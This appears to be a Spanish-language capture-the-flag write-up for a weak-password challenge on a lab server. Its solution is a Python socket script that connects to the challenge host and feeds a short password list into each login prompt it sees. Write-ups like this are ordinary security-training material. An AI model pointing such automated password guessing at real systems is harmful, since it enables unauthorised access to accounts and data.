## Descripcion
A company stored a secret message on a server which got breached due to the admin using weakly hashed passwords. Can you gain access to the secret stored within the server? Access the server using `nc chatelaine.cylabacademy.net 35271`
## Solucion
  

import socket

  

HOST = "chatelaine.cylabacademy.net"

PORT =  29363 # Cambia el puerto si la plataforma asigna otro

  

passwords = [

    "password123",

    "letmein",

    "qwerty098"

]

  

try:

    s = socket.create_connection((HOST, PORT), timeout=15)

    s.settimeout(15)

  

    print("Conectado al servidor.\n")

  

    buffer = ""

    respuestas = 0

  

    while True:

        data = s.recv(1)

  

        if not data:

            break

  

        caracter = data.decode("utf-8", errors="replace")

        print(caracter, end="", flush=True)

        buffer += caracter

  

        # Detectar cuando el servidor solicita una contraseña

        if (

            "password" in buffer.lower()

            and buffer.rstrip().endswith(":")

        ):

            if respuestas < len(passwords):

                password = passwords[respuestas]

                s.sendall((password + "\n").encode())

                print(password)

                respuestas += 1

                buffer = ""

  

    s.close()

    print("\nConexión finalizada.")

  

except ConnectionRefusedError:

    print("\nNo se pudo conectar. Verifica el puerto de la instancia.")

  

except socket.timeout:

    print("\nTiempo de espera agotado.")

  

except Exception as error:

    print("\nError:", error)
## Notas adicionales
Se tuvo que utilizar un codigo en python para este reto, ya que al hacerlo en la terminal marcaba siempre error en cada intento
![[Pasted image 20261024195405.png]]

## Referencias
